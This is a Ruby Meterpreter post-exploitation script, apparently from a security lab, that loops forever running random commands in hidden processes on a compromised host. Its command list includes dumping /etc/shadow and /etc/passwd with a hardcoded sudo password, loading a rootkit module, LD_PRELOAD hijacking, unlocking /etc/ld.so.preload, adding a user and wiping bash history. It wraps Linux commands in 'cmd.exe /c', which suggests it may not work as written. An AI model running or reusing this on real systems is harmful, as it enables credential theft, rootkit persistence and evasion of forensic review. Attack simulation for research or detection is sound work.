 def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    loop do
       begin
          cmd = cmdlst[rand(0...cmdlst.length)]
          print_status "trunning command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("t#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
       sleep rand(5..15)
    end
 end

 commands_array = Array[
    "echo labcom | sudo -S arp", 
    "echo labcom | sudo -S arp -a", 
    "users", 
    "netstat -i",
    "netstat -M",
    "uname -a", "groups", 
    "tcpdump -n > output", 
    "LD_PRELOAD=\"/tmp/wqs.so\" /bin/ls", 
    "echo labcom | sudo -S insmod rootkit.ko", 
    "modprobe -r rootkit.ko", 
    "useradd –g 500 –u 500 –s /usr/local/bin/nocando –d /var/spool/vmail", 
    "mkdir teste", 
    "rm -r teste/", 
    "kill -9 12313123", 
    "lsmod | grep -i \"vboxsf\\|vboxguest\"", 
    "wget https://raw.githubusercontent.com/brnaguiar/linreg-c/main/linreg.py", 
    "chattr -i /etc/ld.so.preload",
    "echo labcom | sudo -S cat /etc/shadow > file",
    "echo labcom | sudo -S cat /etc/passwd > file",
    "echo "" > ~/.bash_history", 
    "ip a", 
    "ip route", 
    "ls", 
    "cd .", 
    "cd ../cnc", 
    "cd ../../average-hacker/cnc/",
    "cd ../../../dns2tcp/average-hacker/cnc",
    "cd ../../../../Desktop/dns2tcp/average-hacker/cnc",
    "cd ../../../../../../../../labcom/Desktop/dns2tcp/average-hacker/cnc",
    "ls -l", 
    "ls -la", 
    "ls ../", 
    "ls ../../", 
    "ls ../../../", 
    "ls ../../../../", 
    "ls ../low/", 
    "ls ../../average-hacker/", 
    "ls ../../../../DNSExfil/", 
    "ls -l ../../average-hacker/", 
    "ls -l ../../../../DNSExfil/", 
    "ls ../../../../.vscode-server/", 
    "ls -l ../../../../.vscode-server/", 
    "cat ../../../../.zshrc", 
    "cat ~/.zshrc", "cat ~/.xsession-errors", 
    "cat ~/../../../../.xsession-errors", 
    "touch teste", 
    "rm teste", 
    "ps aux | grep client", 
    "chmod -x teste", 
    "echo \"asdasdasdad\"", 
    "echo labcom | sudo -S ifconfig lo", 
    "ip a show lo",
    "netstat -s",
    "netstat -r",
    "echo \"asdasdasdasdasdasd asd asd asd asds dasdad\"", 
    "echo \"asdasdasdasdasdasdkasdas f fds f dsfsd fsdfsdfsdf sdfs dfsd fs fsd fs fds fsd fsd f sf ssdf sd fsd fsdf sdf \"",
    "echo \"asdkasdasmdsad asd as das das das d asd asd as das d sa das\"",
    "dig google.com", 
    "dig google.com MX", 
    "nslookup mindmajix.com",
    "echo  labcom | sudo -S route", 
    "iwconfig", 
    "curl -O google.com/doodles/childrens-day-2014-multiple-countries", 
    "whois fcporto.pt", 
    "whois ua.pt",
    "pwd"
]

list_exec(client,commands_array)
